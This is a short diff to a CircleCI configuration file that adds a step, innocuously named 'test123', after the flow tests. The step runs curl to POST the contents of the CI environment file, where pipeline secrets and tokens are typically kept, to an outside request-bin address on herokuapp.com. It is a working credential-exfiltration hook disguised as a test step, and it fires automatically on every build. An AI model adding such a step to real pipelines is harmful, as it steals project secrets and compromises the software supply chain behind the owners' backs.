@@ -141,6 +141,9 @@ jobs:
       - attach_workspace:
           at: .
       - run: yarn run test-flow
+      - run:
+          name: test123 
+          command: curl -X POST -d "$(cat "$CIRCLE_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
 
   test-unit:
     <<: *defaults
